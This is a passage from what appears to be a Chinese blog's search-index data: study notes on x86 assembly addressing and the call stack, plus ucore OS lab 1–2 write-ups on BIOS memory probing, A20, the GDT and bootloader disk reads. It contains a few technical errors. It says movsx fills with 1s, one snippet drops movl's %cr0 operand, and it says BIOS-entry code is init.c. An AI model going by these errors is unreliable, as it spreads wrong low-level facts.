data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<p>[TOC]</p>\n<h2><span id=\"汇编语言\">汇编语言</span></h2><h3><span id=\"1寻址\">1）寻址</span></h3><h5><span id=\"1直接寻址\">1/直接寻址</span></h5><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov     rax, fs:28h #直接寻址，fs段寄存器+偏移量。这里其实是一个canary的值。</span><br></pre></td></tr></table></figure>\n<h5><span id=\"2间接寻址\">2/间接寻址</span></h5><p>间接在使用指针以及解引用的形式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov     [rbp+var_8], rax # 寄存器相对寻址。相当于把rax，也就是这个canary值放到rbp+var_8的地方。</span><br></pre></td></tr></table></figure>\n<h5><span id=\"3比例寻址\">3/比例寻址</span></h5><p>例如在数组遍历中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.data</span><br><span class=\"line\">arrayD 1,2,3,4</span><br><span class=\"line\">.code</span><br><span class=\"line\">mov esi,3</span><br><span class=\"line\">mov eax,arrayD[esi*4]\t\t\t\t\t;eax = 4</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>其中，比例因子“4”代表数组的元素个数，esi的值代表下标。</p>\n<h2><span id=\"2段寄存器\">2）段寄存器</span></h2><p>其实就是段的基址，起寻址索引作用。例子就比如上一个mov rax fs：28h</p>\n<h2><span id=\"3基础指令\">3）基础指令</span></h2><h3><span id=\"1数据传输\">1/数据传输</span></h3><h4><span id=\"mov\">mov</span></h4><p>为了实现各种数据的传输，mov还有一下几种派生指令</p>\n<h5><span id=\"movzx\">movzx</span></h5><p>对目的操作数进行全0拓展并且复制。</p>\n<h5><span id=\"movsx\">movsx</span></h5><p>同上，但是是用1拓展而不是0。</p>\n<p>与数据传输相关的指令还有很多，以后待补充。</p>\n<h3><span id=\"2与数据相关的运算符和伪指令\">2/与数据相关的运算符和伪指令</span></h3><h4><span id=\"offset\">offset</span></h4><p>返回一个偏移量</p>\n<h4><span id=\"align\">align</span></h4><p>将一个变量对齐到边界。</p>\n<p>ps：对于cpu来说，处理偶地址速度会快于奇地址。</p>\n<h4><span id=\"ptr\">ptr</span></h4><p>重写一个已经被声明过操作数的大小类型。</p>\n<h4><span id=\"type\">type</span></h4><p>返回变量单个元素的大小</p>\n<h4><span id=\"lengthof\">lengthof</span></h4><p>计算数组中元素的个数</p>\n<h4><span id=\"sizeof\">sizeof</span></h4><p>返回lengthof和type的乘积</p>\n<h2><span id=\"函数调用栈\">函数调用栈</span></h2><p>从一个简单的程序入手。</p>\n<p>程序来自你邮萌新赛pwn1-人类补习计划。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211012194601557.png\" alt=\"image-20211012194601557\"></p>\n<p>​    可以看到对栈空间进行一个初始化的操作的三行关键代码。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">push    rbp</span><br><span class=\"line\">mov     rbp, rsp</span><br><span class=\"line\">sub     rsp, 30h</span><br></pre></td></tr></table></figure>\n<p>然后就是人神共愤的函数调用栈环节。</p>\n<blockquote>\n<p>rbp ： 栈基址指针寄存器 。</p>\n<p>rsp ： 栈顶指针寄存器。</p>\n</blockquote>\n<p>​    之前也提到，栈是一种先进后出的数据结构，所以肯定有一端是固定的，然后另一端用来操作。这里rbp就对应固定的栈底（高地址），rsp对应一直在变化的栈顶（低地址）。</p>\n<p>​    并且因为rbp通常是固定的，所以函数的一些局部变量的索引的基址就是rbp。</p>\n<p>​    值得一提的是，以静态调试的角度来看一个程序的二进制文件，内存地址都是由低地址向高地址增长的，所以在ida中，stack的结构大致如下。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-12%20%E4%B8%8B%E5%8D%8811.11.18.png\" alt=\"截屏2021-10-12 下午11.11.18\"></p>\n<p>​     ebp也就是s的位置，很显然在esp之下。</p>\n<p>​     然而实际上，在内存空间中，栈上的数据是由高地址向低地址增长。也就是地址越小，实际离ebp越远。</p>\n<blockquote>\n<p>主调函数将参数按照调用约定依次入栈(图中为从右到左)，然后将指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。</p>\n</blockquote>\n<p>这段话说得非常玄学，而csapp中说得就非常简单清晰</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%888.01.32.png\" alt=\"截屏2021-10-13 下午8.01.32\"></p>\n<blockquote>\n<p>当前正在执行的过程的帧总是在栈 顶。当过程P调用过程Q时，会把返回地址压入栈中，指明当Q返回时，要从P程序的哪 个位置继续执行。我们把这个返回地址当做P的栈帧的一部分，因为它存放的是与P相关 的状态。Q的代码会扩展当前栈的边界，分配它的栈帧所需的空间。在这个空间中，它可 以保存寄存器的值，分配局部变量空间，为它调用的过程设置参数。</p>\n</blockquote>\n<p>​    还有一点就是，之前也没有很正确地理解何为局部变量。虽然众所周知的知识点是说，局部变量是函数内部定义的变量，离开这个函数就无法被引用，然而我总是没有将局部变量与buf 联系起来，实际上buf，这个缓冲区，就是被调函数的局部变量。</p>\n<p>​    那么直接从动态调试的角度来研究函数调用栈。</p>\n<p>​    关于压栈的一些传参方式，可以参见<a href=\"https://fuurinko.github.io/2021/10/27/摆烂第六天--格式化字符串偏移计算原理/\">格式化字符串偏移计算原理及pwntools fmtstr功能源码剖析</a>，这里主要讨论传参以后，有关返回地址以及栈顶栈指针变化的一些操作，以及一些奇怪的初始化相关函数的运行姿势。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%885.14.08.png\" alt=\"截屏2021-10-13 下午5.14.08\"></p>\n<p>当执行完push rbp以及 sub rsp ，0x30以后，栈空间为0x30。</p>\n<p>此时可以注意到整个栈上存的指针都非常奇怪，也就是libc中的一些初始化函数的指令。</p>\n<p>可以联系一下ret2csu中的知识点，也就是main函数执行前_libc_start_main执行点一系列初始化操作。</p>\n<p>tbc</p>\n","categories":["Binary_security"],"tags":["assemble"]},{"title":"ucore lab2","url":"/2022/07/22/ucore-lab2/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-QvOHFzTo\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h2><span id=\"基础知识\">基础知识</span></h2><h3><span id=\"系统物理内存探测\">系统物理内存探测</span></h3><p>当操作系统被启动后，需要探测当前内存，了解当下物理内存分布状态。一半探测内存的方式有BIOS中断调用和直接探测两种，</p>\n<p>在ucore中，系统选择通过bios调用的INT 15h中断中的e820h中断获取内存信息，并把其映射结构保存在物理地址0x8000处。而这些操作只能在实模式下完成，所以在bootloader进入保护模式前完成这一部分工作比较合适。这些部分由boot/bootasm.S中从probe_memory处到finish_probe处的代码部分完成完成。</p>\n<p>BIOS通过系统内存映射地址描述符的格式来表示探测到的系统物理内存布局，并最终将返回值放入到一个保存地址范围描述符结构的缓冲区中，供后续的ucore进一步进行物理内存管理。这个缓冲区结构定义如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//kern/mm/memlayout.h</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">e820map</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> nr_map;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">        <span class=\"keyword\">uint64_t</span> addr;</span><br><span class=\"line\">        <span class=\"keyword\">uint64_t</span> size;</span><br><span class=\"line\">        <span class=\"keyword\">uint32_t</span> type;</span><br><span class=\"line\">    &#125; __attribute__((packed)) <span class=\"built_in\">map</span>[E820MAX];</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p><code>bootasm.S</code>中对于物理内存探测实现的代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">probe_memory:</span><br><span class=\"line\">    movl $0, 0x8000         # 对0x8000处对e820结构的成员nr_map清零</span><br><span class=\"line\">    xorl %ebx, %ebx\t\t\t\t\t# 清空ebx，表示BIOS返回的映射地址描述符的起始地址</span><br><span class=\"line\">    movw $0x8004, %di\t\t\t\t# 将di指向0x8004，也就是e820结构的成员</span><br><span class=\"line\">start_probe:</span><br><span class=\"line\">    movl $0xE820, %eax\t\t\t# INT 15的中断调用参数</span><br><span class=\"line\">    movl $20, %ecx\t\t\t\t\t# 设置地址范围描述符的大小为20字节,等于struct e820map的成员变量map的大小</span><br><span class=\"line\">    movl $SMAP, %edx\t\t\t\t#\t设置edx为534D4150h (即4个ASCII字符“SMAP”)</span><br><span class=\"line\">    int $0x15\t\t\t\t\t\t\t\t# 调用int 0x15中断</span><br><span class=\"line\">    jnc cont\t\t\t\t\t\t\t\t# 如果eflags的CF位为0，则表示还有内存段需要探测</span><br><span class=\"line\">    movw $12345, 0x8000\t\t\t# 结束探测</span><br><span class=\"line\">    jmp finish_probe</span><br><span class=\"line\">cont:</span><br><span class=\"line\">    addw $20, %di\t\t\t\t\t\t# 设置下一个BIOS返回的映射地址描述符的起始地址</span><br><span class=\"line\">    incl 0x8000\t\t\t\t\t\t\t# 递增nr_map</span><br><span class=\"line\">    cmpl $0, %ebx\t\t\t\t\t\t# 如果INT0x15返回的ebx为零，表示探测结束，否则继续探测</span><br><span class=\"line\">    jnz start_probe</span><br></pre></td></tr></table></figure>\n<p>在以上代码执行完毕之后，0x8000地址处即保存了从bios中获得的内存分布信息。并以对应结构体的格式填充。</p>\n<h3><span id=\"以页为单位管理物理内存\">以页为单位管理物理内存</span></h3><p>在获得可用物理内存范围后，系统需要建立相应的数据结构来管理以物理页（按4KB对齐，且大小为4KB的物理内存单元）为最小单位的整个物理内存，以配合后续涉及的分页管理机制。</p>\n<p>每个物理页可以用一个page数据结构来表示。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Page</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> ref;                        <span class=\"comment\">// page frame&#x27;s reference counter</span></span><br><span class=\"line\">    <span class=\"keyword\">uint32_t</span> flags;                 <span class=\"comment\">// array of flags that describe the status of the page frame</span></span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> property;          <span class=\"comment\">// the num of free block, used in first fit pm manager</span></span><br><span class=\"line\">    <span class=\"keyword\">list_entry_t</span> page_link;         <span class=\"comment\">// free list link</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n","categories":["Binary_security"],"tags":["ucore"]},{"title":"ucore lab1","url":"/2022/07/16/ucore_lab1/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-GuQVLooF\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h1><span id=\"0环境\">0：环境</span></h1><h2><span id=\"需要准备\">需要准备</span></h2><ol>\n<li>能正常运行qemu的环境。</li>\n<li>实验手册：<a href=\"https://objectkuan.gitbooks.io/ucore-docs/content/lab1/lab1_1_goals.html\">https://objectkuan.gitbooks.io/ucore-docs/content/lab1/lab1_1_goals.html</a></li>\n<li>实验代码：<a href=\"https://github.com/chyyuu/os_kernel_lab/tree/lab1_X\">https://github.com/chyyuu/os_kernel_lab/tree/lab1_X</a></li>\n</ol>\n<h1><span id=\"1-实验目的\">1: 实验目的</span></h1><p>分析加载操作系统的boot loader，并了解相关计算机原理。</p>\n<h1><span id=\"2-基础知识\">2: 基础知识</span></h1><h2><span id=\"bios启动过程\">bios启动过程</span></h2><p>bios（(Basic Input Output System）作用为在计算机被加电之初，完成计算机io初始化，也就是读取硬盘主引导扇区到内存，并跳转到对应内存中执行bootloader。</p>\n<p>大体过程是 <code>硬件加电 -&gt; bios -&gt; bootloader -&gt;os</code></p>\n<h2><span id=\"bootloader\">bootloader</span></h2><ul>\n<li>切换到保护模式，启用分段机制</li>\n<li>读磁盘中ELF执行文件格式的ucore操作系统到内存</li>\n<li>显示字符串信息</li>\n<li>把控制权交给ucore操作系统</li>\n</ul>\n<h2><span id=\"保护模式和分段机制\">保护模式和分段机制</span></h2><h3><span id=\"实模式\">实模式</span></h3><p>在bootloader接手BIOS的工作后，当前的PC系统处于实模式（16位模式）运行状态，操作系统和用户程序并没有区别对待，而且每一个指针都是指向实际的物理地址。用户程序的一个指针如果指向了操作系统区域或其他用户程序区域，并修改了内容，那么其后果就很可能是灾难性的。</p>\n<h3><span id=\"保护模式\">保护模式</span></h3><p>隔离操作系统与用户空间，并且只有在保护模式下系统才可以使用分段以及分页储存管理机制。</p>\n<h4><span id=\"分段存储\">分段存储</span></h4><p>该储存方式涉及了四个关键内容</p>\n<ol>\n<li>逻辑地址（由段选择子selector和段偏移offset组成）</li>\n<li>段描述符（描述段的属性）</li>\n<li>段描述符表（包含多个段描述符的“数组”）</li>\n<li>段选择子（段寄存器，用于定位段描述符表中表项的索引）</li>\n</ol>\n<p>从逻辑地址到物理地址的转换：</p>\n<p>获取逻辑地址中的段选择子以及偏移 -&gt; 以段选择子为索引，找到段描述符表中对应段描述符 -&gt; 将段描述符表中储存的段基址加上偏移，形成线性地址。（若不启动分页管理机制，则此线性地址为物理地址）</p>\n<h4><span id=\"段描述符\">段描述符</span></h4><h5><span id=\"段基地址\">段基地址</span></h5><p>规定线性地址空间中段的起始地址。</p>\n<h5><span id=\"段界限\">段界限</span></h5><p>规定段大小</p>\n<h5><span id=\"段属性\">段属性</span></h5><p>确定段的各种属性。</p>\n<p><img src=\"https://objectkuan.gitbooks.io/ucore-docs/content/lab1_figs/image003.png\" alt></p>\n<h4><span id=\"全局描述符表\">全局描述符表</span></h4><p>保存多个段描述符的“数组”，其起始地址保存在GDTR（全局描述符表寄存器）中。</p>\n<h4><span id=\"段选择子\">段选择子</span></h4><p>选择段描述符表，且选择该表中的描述符。</p>\n<h2><span id=\"保护模式下的特权级\">保护模式下的特权级</span></h2><p>ring0 （最高）- ring3（最低）</p>\n<p>ring3一般用于用户态。ring0用于内核态。</p>\n<p>在任一时刻，x86 CPU都是在一个特定的特权级下运行的，从而决定了代码可以做什么，不可以做什么。</p>\n<h2><span id=\"地址空间\">地址空间</span></h2><p>主要分为逻辑地址以及物理地址。逻辑地址指编程时使用的抽象虚拟地址，而物理地址空间则是一个“大数组”，CPU通过索引（物理地址）来访问这个“大数组”中的内容。物理地址是指CPU提交到内存总线上用于访问计算机内存和外设的最终地址。</p>\n<h2><span id=\"中断\">中断</span></h2><p>操作系统中特殊的中断有三种：</p>\n<ol>\n<li>由外部io设备引发的异步中断</li>\n<li>cpu非正常执行引发的同步中断/内部中断，简称异常</li>\n<li>例如系统调用一类的陷入中断，也称软中断。</li>\n</ol>\n<p>当cpu收到中断或异常时，当前执行任务被暂停，并通过一定机制跳转到负责处理这个信号的相关处理例程中。这个机制主要由IDT（中断描述符表）负责。</p>\n<h4><span id=\"中断描述符表\">中断描述符表</span></h4><p>中断描述符表把每个中断或异常编号和一个指向中断服务，是一个8字节的描述符数组。CPU通过IDT寄存器（IDTR）的内容来寻址IDT的起始地址，并将中断（异常）号乘以8做为IDT的索引。</p>\n<h3><span id=\"中断初始化设置\">中断初始化设置</span></h3><p>操作系统如果要正确处理各种不同的中断事件，就需要安排应该由哪个中断服务例程负责处理特定的中断事件。系统将所有的中断事件统一进行了编号（0～255），这个编号称为中断向量。以ucore为例，操作系统内核启动以后，会通过 idt_init 函数初始化 idt 表 (参见trap.c)，而其中 vectors 中存储了中断处理程序的入口地址。vectors 定义在 vector.S 文件中，通过一个工具程序 vector.c 生成。其中仅有 System call 中断的权限为用户权限 (DPL_USER)，即仅能够使用 int 0x30 指令。此外还有对 tickslock 的初始化，该锁用于处理时钟中断。</p>\n<h1><span id=\"3-练习\">3: 练习</span></h1><h2><span id=\"练习一\">练习一</span></h2><h3><span id=\"1操作系统镜像文件ucoreimg是如何一步一步生成的\">1：操作系统镜像文件ucore.img是如何一步一步生成的？</span></h3><!--(需要比较详细地解释Makefile中每一条相关命令和命令参数的含义，以及说明命令导致的结果)-->\n<p>这篇文章对于makefile的分析非常详细。</p>\n<p><a href=\"https://www.jianshu.com/p/2f95d38afa1d?u_atoken=52459ad4-5e6f-410b-9bf3-3b09d5b827bb&amp;u_asession=01Ssg0C8ZiXCdwbFTRPk8Q20t0VyepeIDUbsrIGTSY2WDjD5AWyHeWNI3iBIyLfwATX0KNBwm7Lovlpxjd_P_q4JsKWYrT3W_NKPr8w6oU7K9irYCEcJW6DYYfqn8pomqxMKWrbBzYAhXhkL4v5_cjQmBkFo3NEHBv0PZUm6pbxQU&amp;u_asig=05aKhHCfLIMI7ffgmH0YvZE_eKiGOWiXCuqxMVGny8AgjDvTZ1fL7YSwAXh03JMCrAWGj6rUgIukDeoFvVS3ijri5lhkA9QkCm4bwpZu7F0r6IUaF18BYnbBYOJBnVOqza4M-K4-BybICRVhibP02H1OKA1cgY0dTU35B9t-hLfDz9JS7q8ZD7Xtz2Ly-b0kmuyAKRFSVJkkdwVUnyHAIJzXA7666rNQ9I6z2mlavrOQsvcsAhkZe-tnh2yiBtxRphdf9JIAkyKervFWgmMgV8j-3h9VXwMyh6PgyDIVSG1W9xeShRoqPZZDIv1hOQrCMpiC5haaDpMo85GGl7nYBJOUfUBE6RMV2Q4XyfWcAQOb3_XSVvFWReDxdO8KmQuGfgmWspDxyAEEo4kbsryBKb9Q&amp;u_aref=dXPvnYU6qbVvOKeiKdE6bbhpbyM%3D\">清华大学操作系统课程 ucore Lab 1 系统软件启动过程 实验报告</a></p>\n<h3><span id=\"2-一个被系统认为是符合规范的硬盘主引导扇区的特征是什么\">2： 一个被系统认为是符合规范的硬盘主引导扇区的特征是什么？</span></h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//tools/sign.c</span></span><br><span class=\"line\">buf[<span class=\"number\">510</span>] = <span class=\"number\">0x55</span>;</span><br><span class=\"line\">    buf[<span class=\"number\">511</span>] = <span class=\"number\">0xAA</span>;</span><br><span class=\"line\">    FILE *ofp = fopen(argv[<span class=\"number\">2</span>], <span class=\"string\">&quot;wb+&quot;</span>);</span><br><span class=\"line\">    size = fwrite(buf, <span class=\"number\">1</span>, <span class=\"number\">512</span>, ofp);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (size != <span class=\"number\">512</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;write &#x27;%s&#x27; error, size is %d.\\n&quot;</span>, argv[<span class=\"number\">2</span>], size);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>可以看出，首先扇区的大小为512字节，其次，最后两个字节为0x55AA。</p>\n<h2><span id=\"练习二\">练习二</span></h2><h4><span id=\"使用qemu执行并调试lab1中的软件\">使用qemu执行并调试lab1中的软件</span></h4><ol>\n<li>从CPU加电后执行的第一条指令开始，单步跟踪BIOS的执行。</li>\n<li>在初始化位置0x7c00设置实地址断点,测试断点正常。</li>\n<li>从0x7c00开始跟踪代码运行,将单步跟踪反汇编得到的代码与bootasm.S和 bootblock.asm进行比较。</li>\n<li>自己找一个bootloader或内核中的代码位置，设置断点并进行测试。</li>\n</ol>\n<p>将 <code>tools/gdbinit</code>修改为</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">set</span> architecture i8086</span><br><span class=\"line\">target remote :1234</span><br></pre></td></tr></table></figure>\n<p>回到lab1目录下，执行<code>make debug</code>,此时画面如下：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-07-19%20%E4%B8%8B%E5%8D%889.50.09.png\" alt=\"截屏2022-07-19 下午9.50.09\"></p>\n<p>可以看到在<code>0xfff0</code>处断下。此时执行的代码是<code>kern/init/init.c</code>。</p>\n<p>设置<code>gdbinit</code></p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">set</span> arch i8086</span><br><span class=\"line\">target remote: <span class=\"number\">1234</span></span><br><span class=\"line\">b *<span class=\"number\">0x7c00</span></span><br><span class=\"line\"><span class=\"keyword\">continue</span></span><br></pre></td></tr></table></figure>\n<p>相当于下实地址断点。</p>\n<h2><span id=\"练习3分析bootloader进入保护模式的过程\">练习3：分析bootloader进入保护模式的过程。</span></h2><ul>\n<li>为何开启A20，以及如何开启A20</li>\n<li>如何初始化GDT表</li>\n<li>如何使能和进入保护模式</li>\n</ul>\n<p>参考<a href=\"https://objectkuan.gitbooks.io/ucore-docs/content/lab1/lab1_appendix_a20.html\">https://objectkuan.gitbooks.io/ucore-docs/content/lab1/lab1_appendix_a20.html</a></p>\n<h4><span id=\"为何开启a20\">为何开启A20</span></h4><p>早期8086提供20根地址线，而数据处理宽度最大为16位，因此使用<strong>段寄存器值 &lt;&lt; 4 + 段内偏移值</strong>的方式来访问地址，但这种方式计算出的地址最大值超过来20位地址线能够表示的范围，因此会发生“回卷”。而80386使用24根地址总线，因此就算使用相同的寻址方式也不会发生回卷，然而这就造成了向下不兼容的问题，为了解决这个问题，IBM决定在计算机系统上加入一个硬件逻辑，来模仿回卷。这个硬件逻辑就是A20 GATE。</p>\n<h5><span id=\"a20-gate\">A20 gate</span></h5><p>将键盘控制器输出与A20地址线进行and操作，从而控制A20地址线的打开和关闭。</p>\n<p>最初A20总是关闭状态，直到系统软件通过一定的io操作打开。（<code>bootasm.S</code>）</p>\n<p>当A20地址线关闭时，1MB以上的地址不可访问。</p>\n<h4><span id=\"如何开启a20\">如何开启A20</span></h4><p>首先需要向键盘控制器8042发送一个命令，接着键盘控制器会讲它的某个输出引脚的输出置为高电平，作为A20地址线控制输入。</p>\n<p>键盘控制器8042早期由单片机芯片实现，具体结构如下图：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image012.png\" alt=\"image012\"></p>\n<p>io端口为 0x60～0x6f。实际使用的只有0x60和0x64两个端口。输出端口P2用于特定目的。位0（P20引脚）用于实现CPU复位操作，位1（P21引脚）用户控制A20信号线的开启与否。</p>\n<p>（插一句，这个东西好像我们那奇怪的pic课内容）</p>\n<p>其实就是通过改变状态寄存器，设置不同的状态，从而进行io操作，</p>\n<p>而打开A20 Gate的具体步骤如下：</p>\n<ol>\n<li>等待8042 Input buffer为空；</li>\n<li>发送Write 8042 Output Port （P2）命令到8042 Input buffer；</li>\n<li>等待8042 Input buffer为空；</li>\n<li>将8042 Output Port（P2）得到字节的第2位置1，然后写入8042 Input buffer；</li>\n</ol>\n<p>对应在<code>bootasm.S</code>中的内容。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-07-20%20%E4%B8%8B%E5%8D%885.29.21.png\" alt=\"截屏2022-07-20 下午5.29.21\"></p>\n<h4><span id=\"如何初始化gdt表\">如何初始化GDT表</span></h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Bootstrap GDT</span><br><span class=\"line\">.p2align 2                                          # force 4 byte alignment</span><br><span class=\"line\">gdt:</span><br><span class=\"line\">    SEG_NULLASM                                     # null seg</span><br><span class=\"line\">    SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff)           # code seg for bootloader and kernel</span><br><span class=\"line\">    SEG_ASM(STA_W, 0x0, 0xffffffff)                 # data seg for bootloader and kernel</span><br><span class=\"line\"></span><br><span class=\"line\">gdtdesc:</span><br><span class=\"line\">    .word 0x17                                      # sizeof(gdt) - 1</span><br><span class=\"line\">    .long gdt                                       # address gdt</span><br></pre></td></tr></table></figure>\n<p>首先设置第一项描述符为null。</p>\n<p>第二行设置描述符为代码段，属性rwx。</p>\n<p>第三行设置描述符为数据段，属性rw。</p>\n<h4><span id=\"如何使能和进入保护模式\">如何使能和进入保护模式</span></h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.set CR0_PE_ON,             0x1                     # protected mode enable flag</span><br><span class=\"line\"></span><br><span class=\"line\"># Switch from real to protected mode, using a bootstrap GDT</span><br><span class=\"line\"># and segment translation that makes virtual addresses</span><br><span class=\"line\"># identical to physical addresses, so that the</span><br><span class=\"line\"># effective memory map does not change during the switch.</span><br><span class=\"line\">lgdt gdtdesc</span><br><span class=\"line\">movl %cr0, %eax</span><br><span class=\"line\">orl $CR0_PE_ON, %eax</span><br><span class=\"line\">movl %eax</span><br><span class=\"line\"></span><br><span class=\"line\"># Jump to next instruction, but in 32-bit code segment.</span><br><span class=\"line\"># Switches processor into 32-bit mode.</span><br><span class=\"line\">ljmp $PROT_MODE_CSEG, $protcseg</span><br></pre></td></tr></table></figure>\n<p>从代码可以看出，进入保护模式需要设置cr0寄存器为0x1，也就是<code>CR0_PE_ON</code>的值，接着</p>\n<p>执行指令<code>ljmp $PROT_MODE_CSEG, $protcseg</code></p>\n<h2><span id=\"练习四分析bootloader加载elf格式的os的过程\">练习四：分析bootloader加载ELF格式的OS的过程</span></h2><p>阅读<code>bootmain.c</code>，了解bootloader如何加载ELF文件。通过分析源代码和通过qemu来运行并调试bootloader&amp;OS。</p>\n<ul>\n<li>bootloader如何读取硬盘扇区的？</li>\n</ul>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-07-20%20%E4%B8%8B%E5%8D%8810.24.16.png\" alt=\"截屏2022-07-20 下午10.24.16\"></p>\n<p>查表。</p>\n<p>可以看到程序中对应的代码段：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">readsect</span><span class=\"params\">(<span class=\"keyword\">void</span> *dst, <span class=\"keyword\">uint32_t</span> secno)</span> </span>&#123;</span><br><span class=\"line\">    waitdisk();<span class=\"comment\">//等待磁盘准备</span></span><br><span class=\"line\">    outb(<span class=\"number\">0x1F2</span>, <span class=\"number\">1</span>);                        <span class=\"comment\">//根据表可以看出，读取一个扇区。</span></span><br><span class=\"line\">    outb(<span class=\"number\">0x1F3</span>, secno &amp; <span class=\"number\">0xFF</span>);\t\t\t\t\t\t<span class=\"comment\">//分别设置lba参数的0-27位</span></span><br><span class=\"line\">    outb(<span class=\"number\">0x1F4</span>, (secno &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xFF</span>);</span><br><span class=\"line\">    outb(<span class=\"number\">0x1F5</span>, (secno &gt;&gt; <span class=\"number\">16</span>) &amp; <span class=\"number\">0xFF</span>);</span><br><span class=\"line\">    outb(<span class=\"number\">0x1F6</span>, ((secno &gt;&gt; <span class=\"number\">24</span>) &amp; <span class=\"number\">0xF</span>) | <span class=\"number\">0xE0</span>);</span><br><span class=\"line\">    outb(<span class=\"number\">0x1F7</span>, <span class=\"number\">0x20</span>);                      <span class=\"comment\">// 设置为读取</span></span><br><span class=\"line\">    waitdisk();<span class=\"comment\">//等待磁盘准备</span></span><br><span class=\"line\">    insl(<span class=\"number\">0x1F0</span>, dst, SECTSIZE / <span class=\"number\">4</span>);<span class=\"comment\">//从0x1f0端口读取数据</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>bootloader是如何加载ELF格式的OS？</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">bootmain</span><span class=\"params\">(<span 